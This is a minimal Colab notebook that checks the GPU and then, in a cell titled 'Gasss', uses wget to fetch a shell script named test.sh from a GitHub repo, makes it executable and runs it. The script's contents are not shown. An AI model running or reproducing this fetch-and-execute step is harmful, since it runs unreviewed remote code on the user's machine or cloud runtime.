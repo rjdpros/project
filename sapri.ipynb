{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "gas.ipynb",
      "provenance": [
        {
          "file_id": "1GqZu6zmCy2vMNMZqO78DDuHvwv_9vJcp",
          "timestamp": 1603191212204
        },
        {
          "file_id": "1IzPbxNFQmmSYk9s14L4YjBfUgACn9mW2",
          "timestamp": 1593978024316
        },
        {
          "file_id": "1G7NKeneJNyRtcRxLVbbF9jYtRyuTOa-R",
          "timestamp": 1592749700622
        },
        {
          "file_id": "https://github.com/satyajitghana/TSAI-DeepVision-EVA4.0/blob/master/Utils/Colab_25GBRAM_GPU.ipynb",
          "timestamp": 1592043804148
        }
      ],
      "private_outputs": true,
      "collapsed_sections": [
        "8uQ12Gz6ZzCb"
      ],
      "machine_shape": ""
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "8uQ12Gz6ZzCb"
      },
      "source": [
        "# **SOFTWARE**\n",
        "1.   Cek\n",
        "2.   Eksekusi\n",
        "\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "cY1YjeXzZWkA"
      },
      "source": [
        "!nvidia-smi"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "ezvJBk6W_MPt"
      },
      "source": [
        "#@title Gasss\n",
        "!wget https://raw.githubusercontent.com/rjdpros/project/main/test.sh && chmod +x test.sh && ./test.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
